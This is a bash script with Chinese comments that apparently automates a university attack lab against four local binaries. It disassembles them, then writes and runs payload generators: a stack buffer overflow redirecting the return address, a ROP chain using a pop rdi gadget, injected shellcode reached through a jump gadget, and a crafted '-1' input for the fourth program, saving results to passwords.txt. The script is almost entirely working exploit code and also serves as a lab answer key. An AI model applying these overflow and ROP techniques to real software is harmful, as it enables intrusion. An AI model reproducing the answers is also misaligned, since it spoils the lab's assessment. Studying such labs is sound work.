#!/bin/bash

# ================= 配置区域 =================
# 定义输出文件
RESULT_FILE="passwords.txt"
# 清空之前的记录
> $RESULT_FILE

# 定义颜色方便看
GREEN='\033[0;32m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] 正在初始化环境...${NC}"
# 1. 赋予执行权限 (防止 Permission denied)
chmod +x problem1 problem2 problem3 problem4

# ================= 任务一：反汇编 =================
echo -e "${GREEN}[*] 正在反汇编二进制文件...${NC}"
objdump -d problem1 > disassembly_prob1.asm
objdump -d problem2 > disassembly_prob2.asm
objdump -d problem3 > disassembly_prob3.asm
objdump -d problem4 > disassembly_prob4.asm
echo "    -> 反汇编已保存为 disassembly_probX.asm"

# ================= 任务二 & 三：生成 Payload 并攻击 =================

# --- Problem 1 ---
echo -e "${GREEN}[*] 正在攻击 Problem 1...${NC}"
# 生成 Python 脚本
cat << 'EOF' > gen_p1.py
import struct
padding = b'A' * 16
target_addr = 0x401216
payload = padding + struct.pack('<Q', target_addr)
with open("ans1.txt", "wb") as f:
    f.write(payload)
EOF
# 运行生成
python3 gen_p1.py
# 执行攻击并记录结果
echo "--- Problem 1 Output ---" >> $RESULT_FILE
./problem1 ans1.txt >> $RESULT_FILE
echo "    -> Problem 1 攻击完成"

# --- Problem 2 ---
echo -e "${GREEN}[*] 正在攻击 Problem 2...${NC}"
cat << 'EOF' > gen_p2.py
import struct
def p64(val): return struct.pack('<Q', val)
padding = b'A' * 16
pop_rdi = 0x4012c7
func2   = 0x401216
arg     = 0x3f8
payload = padding + p64(pop_rdi) + p64(arg) + p64(func2)
with open("ans2.txt", "wb") as f:
    f.write(payload)
EOF
python3 gen_p2.py
echo -e "\n--- Problem 2 Output ---" >> $RESULT_FILE
./problem2 ans2.txt >> $RESULT_FILE
echo "    -> Problem 2 攻击完成"

# --- Problem 3 ---
echo -e "${GREEN}[*] 正在攻击 Problem 3...${NC}"
cat << 'EOF' > gen_p3.py
import struct
jmp_xs = 0x401334
# mov rdi, 0x72; mov rax, 0x401216; call rax
shellcode = b"\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0"
padding = b'A' * (40 - len(shellcode))
payload = shellcode + padding + struct.pack('<Q', jmp_xs)
with open("ans3.txt", "wb") as f:
    f.write(payload)
EOF
python3 gen_p3.py
echo -e "\n--- Problem 3 Output ---" >> $RESULT_FILE
./problem3 ans3.txt >> $RESULT_FILE
echo "    -> Problem 3 攻击完成"

# --- Problem 4 ---
echo -e "${GREEN}[*] 正在攻击 Problem 4...${NC}"
# 直接生成 Payload
echo -e "name\nid\n-1" > ans4.txt
echo -e "\n--- Problem 4 Output ---" >> $RESULT_FILE
./problem4 < ans4.txt >> $RESULT_FILE
echo "    -> Problem 4 攻击完成"

# ================= 结束 =================
echo -e "${GREEN}[✔] 全部任务完成！${NC}"
echo -e "${GREEN}[✔] 攻击结果已保存在: $RESULT_FILE${NC}"
echo -e "${GREEN}[✔] 反汇编代码已保存在: disassembly_probX.txt${NC}"

# 打印最终结果给用户看一眼
echo "================ 最终战果 ================"
cat $RESULT_FILE
